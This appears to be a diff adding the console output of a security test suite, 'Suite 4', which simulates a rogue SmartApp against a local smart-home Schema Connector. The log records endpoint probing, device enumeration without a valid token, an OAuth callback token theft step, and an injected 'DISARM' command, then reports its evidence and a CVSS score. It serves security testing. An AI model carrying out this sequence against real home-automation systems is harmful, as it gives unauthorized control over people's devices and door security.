@@ -1,0 +1,50 @@
+
+============================================================
+  Suite 4 — Malicious SmartApp  |  localhost:8443
+============================================================
+
+
+  ┌────────────────────────────────────────────────────────────────┐
+  │  [1mSuite 4 — MALICIOUS SMARTAPP: OAuth Theft & Command Injection[0m │
+  │  [2mTarget: localhost:8443  |  CWE-269 / CWE-862  |  CVSS 8.8[0m     │
+  └────────────────────────────────────────────────────────────────┘
+
+  [2mA rogue SmartApp abuses over-broad OAuth scopes to:[0m
+  [2m  1. Steal the connector's callback token (stored in memory / on disk)[0m
+  [2m  2. Enumerate every device exposed by the Schema Connector[0m
+  [2m  3. Inject arbitrary commands without user confirmation[0m
+
+  [2m── Step 1 — Probe Schema Connector (discover endpoint) ─[0m
+  [2m[+ 0.000s][0m [96mGET[0m /health
+  [2m[+ 0.002s][0m [92m← 200[0m  {"status": "healthy", "devices": 5, "timestamp": "2026-02-20T21:23:01.096220"}
+
+  [2m── Step 2 — Send discoveryRequest (device enumeration) ─[0m
+  [2m[+ 0.002s][0m [96m→ HUB:[0m  [2mvia rogue SmartApp[0m    [1mPOST /schema  (discoveryRequest)[0m
+  [2m[+ 0.003s][0m [92m← 200[0m  (1747 bytes)
+  [91m[1m◄ 5 devices exposed![0m
+    • vesper-kitchen-light: Kitchen Light
+    • vesper-living-room-light: Living Room Light
+    • vesper-bedroom-dimmer: Bedroom Dimmer
+    • vesper-hallway-motion: Hallway Motion
+    • vesper-front-door: Front Door
+
+  [2m── Step 3 — Steal OAuth callback token (stateRefreshRequest) [0m
+  [2m[+ 0.003s][0m [96m→ HUB:[0m  [2mvia rogue SmartApp[0m    [1mPOST /schema  (stateRefreshRequest)[0m
+  [2m[+ 0.004s][0m [92m← 200[0m  (169 bytes)
+
+  [2m── Step 4 — Inject 'DISARM' command as the cloud ───────[0m
+  [2m[+ 0.004s][0m [96m→ HUB:[0m  [2mvia rogue SmartApp[0m    [1mPOST /schema  (commandRequest → DISARM)[0m
+  [2m[+ 0.005s][0m [92m← 200[0m  (515 bytes)
+  [91m[1m◄ COMMAND INJECTION ACCEPTED — device may have changed state![0m
+  [2m  Response: [{"externalDeviceId": "vesper-kitchen-light", "states": [{"component": "main", "capability": "st.switch", "attribute": "[0m
+
+Result — Malicious SmartApp (OAuth Theft & Command Injection)
+  Severity: [93mHIGH[0m  (CVSS 8.8)
+  Status:   [92m✓ SUCCESS[0m
+  Evidence:
+    1. Schema Connector reachable at localhost:8443 (status 200)
+    2. discoveryRequest returned 5 devices without valid token
+    3. commandRequest with 'DISARM' accepted (status 200) — device vesper-kitchen-light may have executed the command
+  Impact:   5 devices enumerated + 'DISARM' injected
+  Duration: 5ms
+
